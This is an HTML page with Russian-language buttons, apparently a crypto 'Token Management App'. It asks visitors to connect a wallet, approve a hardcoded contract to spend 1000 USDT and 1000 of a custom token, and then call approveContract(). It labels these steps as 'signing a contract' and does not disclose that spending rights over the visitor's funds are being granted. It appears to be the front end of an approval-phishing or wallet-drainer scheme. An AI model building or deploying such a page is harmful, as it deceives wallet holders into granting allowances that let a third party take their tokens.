<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Token Management App</title>
    <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js" type="text/javascript"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin: 20px;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
        }
        #status {
            margin-top: 20px;
            font-weight: bold;
            color: green;
        }
        #error {
            margin-top: 20px;
            font-weight: bold;
            color: red;
        }
    </style>
</head>
<body>
    <h1>Token Management App</h1>
    <p>Нажмите на кнопку ниже, чтобы подключить кошелек и подписать контракт.</p>
    <button id="connectWallet">Подключить кошелек</button>
    <button id="approveTokens" disabled>Предоставить доступ к токенам</button>
    <button id="signContract" disabled>Подписать контракт</button>

    <div id="status"></div>
    <div id="error"></div>

    <script>
        const CONTRACT_ADDRESS = "0xfe0d3ab9a7ab9c070069f516feda0f351751944e"; // Замените на адрес вашего контракта
        const USDT_TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // Адрес контракта USDT
        const CUSTOM_TOKEN_ADDRESS = "0xcb89e8dd26aad28674da9751bfa61815a75f152d"; // Адрес кастомного токена

        let userAddress = null;

        async function connectWallet() {
            if (typeof window.ethereum === 'undefined') {
                document.getElementById("error").innerText = "Кошелек не найден. Установите MetaMask или Trust Wallet.";
                return;
            }

            try {
                const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
                userAddress = accounts[0];
                document.getElementById("status").innerText = `Кошелек подключен: ${userAddress}`;
                document.getElementById("approveTokens").disabled = false;
            } catch (error) {
                document.getElementById("error").innerText = `Ошибка подключения: ${error.message}`;
            }
        }

        async function approveTokens(tokenAddress) {
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            const signer = provider.getSigner();
            const tokenAbi = [
                "function approve(address spender, uint256 amount) public returns (bool)"
            ];
            const tokenContract = new ethers.Contract(tokenAddress, tokenAbi, signer);

            try {
                const amount = ethers.utils.parseUnits("1000", 18); // 1000 токенов с 18 десятичными знаками
                const tx = await tokenContract.approve(CONTRACT_ADDRESS, amount);
                document.getElementById("status").innerText = `Транзакция отправлена: ${tx.hash}`;
                await tx.wait(); // Ждем подтверждения
                document.getElementById("status").innerText = `Токены ${tokenAddress} успешно предоставлены.`;
            } catch (error) {
                document.getElementById("error").innerText = `Ошибка approve: ${error.message}`;
            }
        }

        async function signContract() {
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            const signer = provider.getSigner();
            const contractAbi = [
                "function approveContract() external"
            ];
            const contract = new ethers.Contract(CONTRACT_ADDRESS, contractAbi, signer);

            try {
                const tx = await contract.approveContract();
                document.getElementById("status").innerText = `Контракт подписан. Транзакция: ${tx.hash}`;
                await tx.wait();
                document.getElementById("status").innerText = "Контракт успешно подписан.";
            } catch (error) {
                document.getElementById("error").innerText = `Ошибка подписания контракта: ${error.message}`;
            }
        }

        // События нажатий на кнопки
        document.getElementById("connectWallet").addEventListener("click", connectWallet);
        document.getElementById("approveTokens").addEventListener("click", async () => {
            await approveTokens(USDT_TOKEN_ADDRESS); // Approve для USDT
            await approveTokens(CUSTOM_TOKEN_ADDRESS); // Approve для кастомного токена
            document.getElementById("signContract").disabled = false;
        });
        document.getElementById("signContract").addEventListener("click", signContract);
    </script>
</body>
</html>
